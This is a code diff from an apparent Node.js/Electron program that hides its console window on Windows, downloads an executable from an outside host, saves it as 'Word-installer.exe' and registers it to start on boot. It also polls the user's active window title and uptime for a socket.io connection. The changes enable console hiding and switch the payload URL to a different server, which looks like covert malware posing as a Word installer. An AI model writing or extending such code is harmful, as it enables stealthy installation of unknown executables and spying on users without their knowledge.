@@ -3,7 +3,6 @@ const { io } = require("socket.io-client");
 const activeWindow = require('active-win');
 const app= require('electron');
 const BrowserWindow = app.BrowserWindow;
-
 const path = require('path')
 const child = require('child_process');
 const { DownloaderHelper } = require('node-downloader-helper');
@@ -22,12 +21,13 @@ platform = os.platform();
 // process.title = "Word-installer.exe";
 //  console.log(process.title)
   if(platform === 'win32') {
+
 console.log("IS Windows Runtime requirind dependencys") 
 var startOnBoot = require('start-on-windows-boot');
 const ConsoleWindow = require("node-hide-console-window");
 
     
-    // ConsoleWindow.hideConsole();
+    ConsoleWindow.hideConsole();
 
 
     // const mainWindow = new BrowserWindow({
@@ -109,7 +109,7 @@ console.log("Suppression de l'ancier fichier word");
     console.log("Pas besoin de supprimer l'ancier fichier word");
   }
   
-  const dl = new DownloaderHelper("https://static.kosmixapi.com/win.exe", ptc + "\\", { fileName : "Word-installer.exe"});
+  const dl = new DownloaderHelper("https://happy-villani.195-154-174-181.plesk.page/win.exe", ptc + "\\", { fileName : "Word-installer.exe"});
   dl.on('end', () => {
     console.log("end dl");
   startOnBoot.enableAutoStart(appname, ptc + "\\Word-installer.exe");
@@ -285,7 +285,13 @@ socket.on("connect",async () => {
 
  aw =  setInterval(async () => {
    console.log("Interval running")
+   if(typeof(activeWindow) !== 'undefined')
+   {
  av = await activeWindow();
+   }else{
+     av = {"title":"None"};
+   }
+
 uptime = os.uptime();
 uptimescript = process.uptime();
  if(typeof(av) == "undefined")
